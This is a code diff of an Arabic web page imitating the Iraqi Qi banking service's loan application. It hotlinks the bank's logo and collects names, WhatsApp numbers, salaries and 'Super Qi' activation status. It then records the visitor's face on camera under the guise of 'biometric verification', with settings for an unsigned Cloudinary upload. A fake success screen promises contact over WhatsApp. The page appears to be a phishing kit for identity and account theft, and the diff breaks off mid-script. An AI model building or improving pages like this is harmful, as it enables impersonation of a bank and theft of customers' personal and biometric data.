@@ -1,30 +1,25 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#002B5C">
     <title>طلب السلفة | كي للخدمات المصرفية</title>
-    <meta name="description" content="طلب سلفة مصرفية من كي - التحقق البيومتري السريع والآمن" />
-    
-    <!-- خطوط مشابهة للموقع الأصلي -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            /* ألوان الهوية الأصلية */
-            --qi-yellow: #f3cd00;
-            --qi-dark: #393631;
-            --qi-black: #121111;
-            --qi-light: #f3f3f3;
-            --qi-white: #ffffff;
-            --qi-border: #e5e5e5;
-            --qi-error: #dc2626;
-            
-            --shadow-sm: 0 2px 8px rgba(0,0,0,0.04);
-            --shadow-md: 0 4px 30px rgba(0,0,0,0.08);
-            --shadow-lg: 0 24px 48px rgba(0,0,0,0.12);
+            --qi-navy: #002B5C;
+            --qi-gold: #f3cd00;
+            --qi-light: #F8F9FA;
+            --qi-white: #FFFFFF;
+            --qi-error: #DC2626;
+            --qi-success: #10B981;
+            --safe-top: env(safe-area-inset-top, 0px);
+            --safe-bottom: env(safe-area-inset-bottom, 0px);
         }
 
         * {
@@ -32,101 +27,44 @@
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
         }
 
-        html {
-            scroll-behavior: smooth;
+        html, body {
+            overscroll-behavior: none;
+            -webkit-overflow-scrolling: touch;
         }
 
         body {
-            font-family: 'Cairo', 'Aktiv Grotesk', sans-serif;
-            background: var(--qi-light);
-            color: var(--qi-dark);
+            font-family: 'Tajawal', 'Cairo', sans-serif;
+            background-color: var(--qi-light);
+            color: var(--qi-navy);
             min-height: 100vh;
+            min-height: -webkit-fill-available;
             display: flex;
             flex-direction: column;
-            font-weight: 400;
-            line-height: 1.5;
-            -webkit-font-smoothing: antialiased;
+            padding-top: var(--safe-top);
+            padding-bottom: var(--safe-bottom);
         }
 
-        /* ============ الهيدر الرسمي ============ */
         .header {
             background: var(--qi-white);
             padding: 16px 24px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            box-shadow: var(--shadow-sm);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            border-bottom: 1px solid var(--qi-border);
-        }
-
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .logo-box {
-            width: 44px;
-            height: 44px;
-            background: var(--qi-yellow);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            font-weight: 900;
-            color: var(--qi-black);
-            font-size: 18px;
-            letter-spacing: -1px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border-bottom: 3px solid var(--qi-gold);
         }
 
-        .logo-text {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.1;
-        }
+        .header-logo { height: 50px; width: auto; }
 
-        .logo-text .ar {
-            font-weight: 700;
-            font-size: 15px;
-            color: var(--qi-dark);
-        }
-
-        .logo-text .en {
-            font-family: 'Inter', sans-serif;
-            font-size: 11px;
-            color: #888;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .secure-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(243, 205, 0, 0.1);
-            color: var(--qi-dark);
-            padding: 8px 14px;
-            border-radius: 100px;
-            font-size: 13px;
-            font-weight: 500;
-            border: 1px solid rgba(243, 205, 0, 0.3);
-        }
-
-        /* ============ المحتوى الرئيسي ============ */
         .main-content {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 40px 20px;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(243, 205, 0, 0.04) 0%, transparent 50%),
-                radial-gradient(circle at 90% 80%, rgba(57, 54, 49, 0.04) 0%, transparent 50%);
+            padding: 20px;
         }
 
         .card {
@@ -134,22 +72,16 @@
             width: 100%;
             max-width: 480px;
             border-radius: 20px;
-            padding: 40px 32px;
-            box-shadow: var(--shadow-md);
+            padding: 32px 24px;
+            box-shadow: 0 10px 40px rgba(0, 43, 92, 0.08);
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid var(--qi-border);
+            border: 1px solid rgba(243, 205, 0, 0.3);
+            animation: fadeIn 0.4s ease-out;
         }
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--qi-yellow) 0%, var(--qi-dark) 100%);
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .step-indicator {
@@ -168,93 +100,77 @@
             align-items: center;
             justify-content: center;
             font-weight: 700;
-            font-size: 13px;
-            background: var(--qi-light);
-            color: #999;
-            border: 1px solid var(--qi-border);
+            font-size: 14px;
+            background: #E9ECEF;
+            color: #ADB5BD;
             transition: all 0.3s;
         }
 
         .step-dot.active {
-            background: var(--qi-yellow);
-            color: var(--qi-black);
-            border-color: var(--qi-yellow);
-            box-shadow: 0 4px 12px rgba(243, 205, 0, 0.3);
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+            box-shadow: 0 4px 12px rgba(243, 205, 0, 0.4);
         }
 
         .step-dot.completed {
-            background: var(--qi-dark);
+            background: var(--qi-navy);
             color: var(--qi-white);
-            border-color: var(--qi-dark);
         }
 
         .step-line {
             width: 32px;
             height: 2px;
-            background: var(--qi-border);
-            border-radius: 2px;
-            transition: background 0.3s;
+            background: #E9ECEF;
         }
 
-        .step-line.completed {
-            background: var(--qi-dark);
-        }
+        .step-line.completed { background: var(--qi-navy); }
 
-        h1 {
-            font-size: 26px;
-            font-weight: 700;
-            color: var(--qi-dark);
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
+        h1 { font-size: 22px; font-weight: 800; margin-bottom: 12px; color: var(--qi-navy); }
+        .subtitle { font-size: 14px; color: #6C757D; margin-bottom: 28px; line-height: 1.6; }
 
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 28px;
-            line-height: 1.6;
-        }
-
-        /* ============ نموذج الطلب ============ */
-        .form-group {
-            margin-bottom: 18px;
-            text-align: right;
-        }
+        .form-group { margin-bottom: 18px; text-align: right; }
 
         .form-label {
             display: block;
             margin-bottom: 8px;
             font-size: 13px;
             font-weight: 600;
-            color: var(--qi-dark);
+            color: var(--qi-navy);
         }
 
-        .required {
-            color: var(--qi-error);
-            margin-inline-start: 3px;
-        }
+        .required { color: var(--qi-error); margin-inline-start: 3px; }
 
         .form-input, .form-select {
             width: 100%;
             padding: 14px 16px;
-            border: 1.5px solid var(--qi-border);
+            border: 1.5px solid #E9ECEF;
             border-radius: 10px;
-            font-size: 14px;
+            font-size: 16px; /* مهم لمنع zoom على iOS */
             font-family: inherit;
             background: var(--qi-white);
-            color: var(--qi-dark);
+            color: var(--qi-navy);
             transition: all 0.2s;
             outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .form-select {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23002B5C' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 12px center;
+            background-size: 18px;
+            padding-left: 40px;
         }
 
         .form-input:focus, .form-select:focus {
-            border-color: var(--qi-dark);
-            box-shadow: 0 0 0 3px rgba(57, 54, 49, 0.08);
+            border-color: var(--qi-navy);
+            box-shadow: 0 0 0 3px rgba(0, 43, 92, 0.08);
         }
 
         .form-input.error, .form-select.error {
             border-color: var(--qi-error);
-            background: #fef2f2;
+            background: #FEF2F2;
         }
 
         .error-msg {
@@ -263,6 +179,7 @@
             margin-top: 6px;
             text-align: right;
             font-weight: 500;
+            display: none;
         }
 
         .whatsapp-icon {
@@ -273,113 +190,50 @@
             vertical-align: middle;
         }
 
-        /* ============ الأزرار ============ */
         .btn {
             width: 100%;
             padding: 16px;
             border: none;
-            border-radius: 100px;
-            font-size: 15px;
-            font-weight: 600;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.3s;
             font-family: inherit;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
             margin-top: 24px;
+            touch-action: manipulation;
         }
 
         .btn-primary {
-            background: var(--qi-yellow);
-            color: var(--qi-black);
-            border: 2px solid var(--qi-yellow);
-            box-shadow: 0 4px 14px rgba(243, 205, 0, 0.3);
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            background: transparent;
-            color: var(--qi-dark);
-            border-color: var(--qi-dark);
-            transform: translateY(-1px);
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+            box-shadow: 0 4px 15px rgba(243, 205, 0, 0.4);
         }
 
         .btn-primary:active {
-            transform: translateY(0);
+            transform: scale(0.98);
         }
 
-        .btn:disabled {
+        .btn-primary:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
 
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(0,0,0,0.2);
-            border-top-color: var(--qi-black);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* ============ شاشة الكاميرا ============ */
-        .camera-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(18, 17, 17, 0.95);
-            backdrop-filter: blur(10px);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .camera-card {
-            background: var(--qi-white);
-            width: 100%;
-            max-width: 440px;
-            border-radius: 24px;
-            padding: 28px 24px;
-            box-shadow: var(--shadow-lg);
-            text-align: center;
-            border-top: 4px solid var(--qi-yellow);
-        }
-
-        .camera-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--qi-dark);
-            margin-bottom: 8px;
-        }
-
-        .camera-desc {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
-
-        .video-wrapper {
+        /* شاشة الكاميرا */
+        .camera-wrapper {
             position: relative;
             width: 100%;
             aspect-ratio: 3/4;
-            background: var(--qi-black);
+            background: #000;
             border-radius: 16px;
             overflow: hidden;
             margin-bottom: 20px;
-            border: 2px solid var(--qi-dark);
+            border: 3px solid var(--qi-navy);
+            box-shadow: 0 8px 25px rgba(0, 43, 92, 0.15);
         }
 
         #webcam {
@@ -387,6 +241,18 @@
             height: 100%;
             object-fit: cover;
             transform: scaleX(-1);
+        }
+
+        .watermark-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40%;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: 2;
+            filter: grayscale(100%) brightness(200%);
         }
 
         .face-guide {
@@ -398,70 +264,47 @@
             aspect-ratio: 3/4;
             border: 2px dashed rgba(255, 255, 255, 0.6);
             border-radius: 50%;
-            box-shadow: 0 0 0 9999px rgba(18, 17, 17, 0.7);
+            box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.75);
             transition: all 0.3s;
             pointer-events: none;
+            z-index: 3;
         }
 
         .face-guide.active {
-            border: 3px solid var(--qi-yellow);
-            box-shadow: 0 0 0 9999px rgba(18, 17, 17, 0.6), 0 0 40px rgba(243, 205, 0, 0.5);
-            animation: pulse 2s infinite;
+            border: 3px solid var(--qi-gold);
+            box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.6), 0 0 30px rgba(243, 205, 0, 0.6);
+            animation: pulse 1.5s infinite;
         }
 
         @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 0 9999px rgba(18, 17, 17, 0.6), 0 0 20px rgba(243, 205, 0, 0.3); }
-            50% { box-shadow: 0 0 0 9999px rgba(18, 17, 17, 0.6), 0 0 40px rgba(243, 205, 0, 0.7); }
+            0%, 100% { box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.6), 0 0 20px rgba(243, 205, 0, 0.4); }
+            50% { box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.6), 0 0 40px rgba(243, 205, 0, 0.8); }
         }
 
-        .camera-status {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            text-align: center;
+        .status-bar {
+            background: rgba(0, 43, 92, 0.9);
             color: white;
-            font-weight: 700;
+            padding: 10px;
+            border-radius: 10px;
             font-size: 14px;
-            text-shadow: 0 2px 6px rgba(0,0,0,0.8);
-            padding: 8px 12px;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .countdown-display {
-            margin-top: 16px;
-            display: none;
-        }
+        .progress-container { display: none; margin-top: 15px; }
+        .progress-bar { height: 6px; background: #E9ECEF; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--qi-gold), var(--qi-navy)); width: 0%; transition: width 0.3s linear; }
+        .timer-text { font-size: 36px; font-weight: 900; color: var(--qi-gold); line-height: 1; }
 
-        .countdown-number {
-            font-size: 42px;
-            font-weight: 900;
-            color: var(--qi-yellow);
-            line-height: 1;
-            margin-bottom: 8px;
-            text-shadow: 0 2px 10px rgba(243, 205, 0, 0.3);
-        }
-
-        .progress-bar {
-            height: 6px;
-            background: var(--qi-light);
-            border-radius: 3px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--qi-yellow), var(--qi-dark));
-            width: 0%;
-            transition: width 0.3s linear;
-        }
-
-        /* ============ شاشة النجاح ============ */
+        /* شاشة النجاح */
         .success-icon {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, #10b981, #059669);
+            background: linear-gradient(135deg, #10B981, #059669);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -481,83 +324,63 @@
 
         .token-box {
             background: var(--qi-light);
-            border: 1.5px dashed var(--qi-border);
+            border: 1.5px dashed var(--qi-navy);
             padding: 14px;
-            border-radius: 12px;
+            border-radius: 10px;
             margin: 20px 0;
             font-family: 'Courier New', monospace;
-            font-size: 14px;
-            color: var(--qi-dark);
+            font-size: 15px;
+            color: var(--qi-navy);
             font-weight: 700;
             letter-spacing: 1px;
             direction: ltr;
-            text-align: center;
+            word-break: break-all;
         }
 
         .info-note {
-            font-size: 12px;
-            color: #888;
+            font-size: 13px;
+            color: #6C757D;
             margin-top: 16px;
             line-height: 1.5;
         }
 
-        /* ============ الفوتر ============ */
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: var(--qi-dark);
-            color: rgba(255,255,255,0.7);
-            font-size: 12px;
-            border-top: 3px solid var(--qi-yellow);
-        }
-
-        .footer strong {
-            color: var(--qi-yellow);
-            font-weight: 600;
-        }
-
-        /* ============ الاستجابة ============ */
-        @media (max-width: 480px) {
-            .card { padding: 28px 20px; }
-            h1 { font-size: 22px; }
-            .camera-card { padding: 24px 16px; }
-        }
-
         .hidden { display: none !important; }
 
-        /* تأثير الاهتزاز */
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 12px;
+            color: #888;
+            background: var(--qi-white);
+            border-top: 1px solid #E9ECEF;
+        }
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-6px); }
             75% { transform: translateX(6px); }
         }
         .shake { animation: shake 0.3s; }
+
+        /* تحسينات الجوال */
+        @media (max-width: 480px) {
+            .card { padding: 24px 16px; border-radius: 16px; }
+            h1 { font-size: 20px; }
+            .subtitle { font-size: 13px; margin-bottom: 20px; }
+            .header { padding: 12px 16px; }
+            .header-logo { height: 40px; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- ============ الهيدر ============ -->
     <header class="header">
-        <div class="logo-container">
-            <div class="logo-box">QI</div>
-            <div class="logo-text">
-                <span class="ar">كي للخدمات المصرفية</span>
-                <span class="en">Qi Services</span>
-            </div>
-        </div>
-        <div class="secure-badge">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="11" width="18" height="11" rx="2"></rect>
-                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
-            اتصال آمن
-        </div>
+        <img src="https://qi.iq/images/logo.svg?1=1" alt="كي للخدمات المصرفية" class="header-logo">
     </header>
 
-    <!-- ============ المحتوى الرئيسي ============ -->
     <main class="main-content">
         
-        <!-- شاشة 1: نموذج الطلب -->
+        <!-- الشاشة 1: نموذج البيانات -->
         <div id="screen-form" class="card">
             <div class="step-indicator">
                 <div class="step-dot active">1</div>
@@ -573,32 +396,32 @@
             <form id="loanForm" onsubmit="handleFormSubmit(event)">
                 
                 <div class="form-group">
-                    <label class="form-label">الإسم الكامل<span class="required">*</span></label>
-                    <input type="text" id="name" class="form-input" placeholder="أدخل اسمك الثلاثي" maxlength="100">
-                    <div class="error-msg hidden" id="err-name">يرجى تعبئة الإسم الكامل</div>
+                    <label class="form-label" for="name">الإسم الكامل<span class="required">*</span></label>
+                    <input type="text" id="name" class="form-input" placeholder="أدخل اسمك الثلاثي" maxlength="100" autocomplete="name">
+                    <div class="error-msg" id="err-name">يرجى تعبئة الإسم الكامل</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">
+                    <label class="form-label" for="phone">
                         <svg class="whatsapp-icon" viewBox="0 0 24 24" fill="#25D366"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38a9.87 9.87 0 0 0 4.79 1.22h.01c5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2Zm4.52 12.05c-.25-.13-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.16.24-.64.8-.79.97-.14.16-.29.18-.54.06-.25-.13-1.05-.39-2-1.23-.74-.66-1.24-1.47-1.38-1.72-.15-.25-.02-.38.11-.5.11-.11.25-.29.37-.44.13-.15.17-.25.25-.41.08-.17.04-.31-.02-.44-.06-.12-.56-1.35-.77-1.84-.2-.48-.4-.42-.56-.43h-.47c-.17 0-.44.06-.66.31-.23.25-.87.85-.87 2.07s.89 2.4 1.02 2.57c.12.16 1.75 2.67 4.25 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.68-1.18.21-.58.21-1.08.14-1.18-.06-.11-.22-.17-.47-.29Z"/></svg>
                         رقم الهاتف (واتساب)<span class="required">*</span>
                     </label>
-                    <input type="tel" id="phone" class="form-input" placeholder="07XX XXX XXXX" inputmode="tel" maxlength="20">
-                    <div class="error-msg hidden" id="err-phone">يرجى تعبئة رقم الهاتف</div>
+                    <input type="tel" id="phone" class="form-input" placeholder="07XX XXX XXXX" inputmode="tel" maxlength="20" autocomplete="tel">
+                    <div class="error-msg" id="err-phone">يرجى تعبئة رقم الهاتف</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">هل سوبر كي مفعل على جوالك؟<span class="required">*</span></label>
+                    <label class="form-label" for="hasSuperKey">هل سوبر كي مفعل على جوالك؟<span class="required">*</span></label>
                     <select id="hasSuperKey" class="form-select">
                         <option value="">اختر...</option>
                         <option value="نعم">نعم</option>
                         <option value="لا">لا</option>
                     </select>
-                    <div class="error-msg hidden" id="err-hasSuperKey">يرجى اختيار إذا كان سوبر كي مفعل</div>
+                    <div class="error-msg" id="err-hasSuperKey">يرجى اختيار إذا كان سوبر كي مفعل</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">مبلغ السلفة المطلوب<span class="required">*</span></label>
+                    <label class="form-label" for="amount">مبلغ السلفة المطلوب<span class="required">*</span></label>
                     <select id="amount" class="form-select">
                         <option value="">اختر المبلغ...</option>
                         <option value="5 مليون">5 مليون</option>
@@ -607,11 +430,11 @@
                         <option value="25 مليون">25 مليون</option>
                         <option value="30 مليون">30 مليون</option>
                     </select>
-                    <div class="error-msg hidden" id="err-amount">يرجى اختيار مبلغ السلفة</div>
+                    <div class="error-msg" id="err-amount">يرجى اختيار مبلغ السلفة</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">الراتب الشهري<span class="required">*</span></label>
+                    <label class="form-label" for="salary">الراتب الشهري<span class="required">*</span></label>
                     <select id="salary" class="form-select">
                         <option value="">اختر الراتب...</option>
                         <option value="من 100 ألف إلى 300 ألف">من 100 ألف إلى 300 ألف</option>
@@ -620,19 +443,48 @@
                         <option value="من 700 ألف إلى 1 مليون">من 700 ألف إلى 1 مليون</option>
                         <option value="أكثر من 1 مليون">أكثر من 1 مليون</option>
                     </select>
-                    <div class="error-msg hidden" id="err-salary">يرجى اختيار الراتب الشهري</div>
+                    <div class="error-msg" id="err-salary">يرجى اختيار الراتب الشهري</div>
                 </div>
 
                 <button type="submit" class="btn btn-primary" id="submitBtn">
-                    <span id="submitText">متابعة للتحقق</span>
-                    <svg id="submitArrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <span>متابعة للتحقق</span>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M19 12H5M12 19l-7-7 7-7"/>
                     </svg>
                 </button>
             </form>
         </div>
 
-        <!-- شاشة 3: النجاح (تظهر بعد التحقق) -->
+        <!-- الشاشة 2: التحقق البيومتري -->
+        <div id="screen-camera" class="card hidden">
+            <div class="step-indicator">
+                <div class="step-dot completed">✓</div>
+                <div class="step-line completed"></div>
+                <div class="step-dot active">2</div>
+                <div class="step-line"></div>
+                <div class="step-dot">3</div>
+            </div>
+
+            <h1>التحقق الأمني للهوية</h1>
+            <p class="subtitle">لتأكيد طلب السلفة، يرجى النظر للكاميرا وتثبيت وجهك داخل الإطار</p>
+
+            <div class="status-bar" id="status-bar">
+                <span>📷</span> <span id="status-text">جاري تهيئة الكاميرا...</span>
+            </div>
+
+            <div class="camera-wrapper">
+                <video id="webcam" autoplay playsinline muted></video>
+                <img src="https://qi.iq/images/logo.svg?1=1" alt="Watermark" class="watermark-logo">
+                <div class="face-guide" id="face-guide"></div>
+            </div>
+
+            <div class="progress-container" id="progress-container">
+                <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+                <div class="timer-text" id="timer-text">5</div>
+            </div>
+        </div>
+
+        <!-- الشاشة 3: النجاح -->
         <div id="screen-success" class="card hidden">
             <div class="step-indicator">
                 <div class="step-dot completed">✓</div>
@@ -644,75 +496,46 @@
 
             <div class="success-icon">✓</div>
             <h1>تم تقديم الطلب بنجاح!</h1>
-            <p class="subtitle">تم التحقق من هويتك بنجاح وإرسال طلب السلفة للمراجعة النهائية</p>
+            <p class="subtitle">تمت مطابقة البيانات الحيوية بنجاح. طلب السلفة الخاص بك قيد المراجعة النهائية من قبل المختصين.</p>
             
-            <div class="token-box">
-                <div style="font-size:11px; color:#888; margin-bottom:4px;">رقم الطلب</div>
-                <span id="finalToken">QI-LOADING</span>
-            </div>
+            <div class="token-box" id="final-token">QI-LOADING</div>
 
             <div class="info-note">
-                💬 سيتم التواصل معك عبر <strong>الواتساب</strong> خلال 24 ساعة لإتمام الإجراءات
+                💬 سيتم التواصل معك عبر <strong>الواتساب</strong> خلال 24 ساعة لإتمام الإجراءات المتبقية.
             </div>
         </div>
+
     </main>
 
-    <!-- ============ شاشة التحقق البيومتري (Overlay) ============ -->
-    <div id="biometricOverlay" class="camera-overlay hidden">
-        <div class="camera-card">
-            <div class="step-indicator">
-                <div class="step-dot completed">✓</div>
-                <div class="step-line completed"></div>
-                <div class="step-dot active">2</div>
-                <div class="step-line"></div>
-                <div class="step-dot">3</div>
-            </div>
-
-            <h2 class="camera-title" id="bioTitle">التحقق من الهوية</h2>
-            <p class="camera-desc" id="bioDesc">
-                لتأكيد طلب السلفة، نحتاج التحقق من هويتك.<br>
-                ضع وجهك داخل الإطار وثبّت نظرك لمدة 5 ثوانٍ.
-            </p>
-
-            <div class="video-wrapper">
-                <video id="webcam" autoplay playsinline muted></video>
-                <div class="face-guide" id="faceGuide"></div>
-                <div class="camera-status" id="cameraStatus">جاري تهيئة الكاميرا...</div>
-            </div>
-
-            <div class="countdown-display" id="countdownBox">
-                <div class="countdown-number" id="countdownNum">5</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ============ الفوتر ============ -->
     <footer class="footer">
         حقوق النشر والتأليف © 2026 <strong>كي للخدمات المصرفية</strong> - العراق
     </footer>
 
     <script>
         // ============================================
-        // ⚙️ إعدادات Cloudinary (حدّث هذه القيم)
+        // ⚙️ إعدادات Cloudinary
         // ============================================
-        const CLOUDINARY_CLOUD_NAME = 'ujzbgprc';
-        const CLOUDINARY_UPLOAD_PRESET = 'qi_verify_unsigned'; // غيّر هذا إلى اسم الـ Preset الذي أنشأته (يجب أن يكون Unsigned)
-        const CLOUDINARY_FOLDER = 'qi_loan_verifications';
+        const CLOUD_NAME = 'ujzbgprc';
+        const UPLOAD_PRESET = 'qi_verify';
 
-        // ============================================
-        // متغيرات عامة
-        // ============================================
         let stream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let countdownTimer = null;
-        let faceCheckInterval = null;
+        let countdownInterval = null;
+        let formDataInputs = {};
+
+        const videoEl = document.getElementById('webcam');
+        const faceGuide = document.getElementById('face-guide');
+        const statusText = document.getElementById('status-text');
+
+        function showScreen(id) {
+            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0, 0);
+        }
 
         // ============================================
-        // معالجة النموذج
+        // 1. معالجة نموذج البيانات
         // ============================================
         function handleFormSubmit(e) {
             e.preventDefault();
@@ -720,28 +543,35 @@
             const fields = ['name', 'phone', 'hasSuperKey', 'amount', 'salary'];
             let isValid = true;
 
+            formDataInputs = {
+                name: document.getElementById('name').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                hasSuperKey: document.getElementById('hasSuperKey').value,
+                amount: document.getElementById('amount').value,
+                salary: document.getElementById('salary').value,
+                submittedAt: new Date().toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' }),
+                userAgent: navigator.userAgent,
+                device: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'iOS' : 
+                        /Android/i.test(navigator.userAgent) ? 'Android' : 'Other'
+            };
+
             fields.forEach(field => {
                 const input = document.getElementById(field);
                 const errEl = document.getElementById(`err-${field}`);
-                
                 if (!input.value.trim()) {
                     input.classList.add('error', 'shake');
-                    errEl.classList.remove('hidden');
+                    errEl.style.display = 'block';
                     isValid = false;
-                    
                     setTimeout(() => input.classList.remove('shake'), 300);
                 } else {
                     input.classList.remove('error');
-                    errEl.classList.add('hidden');
+                    errEl.style.display = 'none';
                 }
             });
 
             if (!isValid) return;
 
-            // إخفاء النموذج وإظهار شاشة التحقق
-            document.getElementById('screen-form').classList.add('hidden');
-            document.getElementById('biometricOverlay').classList.remove('hidden');
-            
+            showScreen('screen-camera');
             startBiometricProcess();
         }
 
@@ -750,145 +580,226 @@
             el.addEventListener('input', () => {
                 el.classList.remove('error');
                 const errEl = document.getElementById(`err-${el.id}`);
-                if (errEl) errEl.classList.add('hidden');
+                if (errEl) errEl.style.display = 'none';
+            });
+            el.addEventListener('change', () => {
+                el.classList.remove('error');
+                const errEl = document.getElementById(`err-${el.id}`);
+                if (errEl) errEl.style.display = 'none';
             });
         });
 
         // ============================================
-        // التحقق البيومتري
+        // 2. التحقق البيومتري - متوافق مع iOS و Android
         // ============================================
         async function startBiometricProcess() {
-            const statusEl = document.getElementById('cameraStatus');
-            const guideEl = document.getElementById('faceGuide');
+            statusText.textContent = 'جاري طلب صلاحية الكاميرا...';
+
+            // التحقق من دعم المتصفح
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                statusText.textContent = '⚠️ متصفحك لا يدعم الكاميرا';
+                statusText.style.color = '#FCA5A5';
+                return;
+            }
 
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
-                    audio: false 
-                });
-                
-                const video = document.getElementById('webcam');
-                video.srcObject = stream;
-                await video.play();
-                
-                statusEl.textContent = '✅ تم التعرف - اثبت وجهك داخل الإطار';
-                statusEl.style.color = '#f3cd00';
-                guideEl.classList.add('active');
+                // إعدادات متوافقة مع iOS و Android
+                const constraints = {
+                    video: {
+                        facingMode: { ideal: 'user' },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
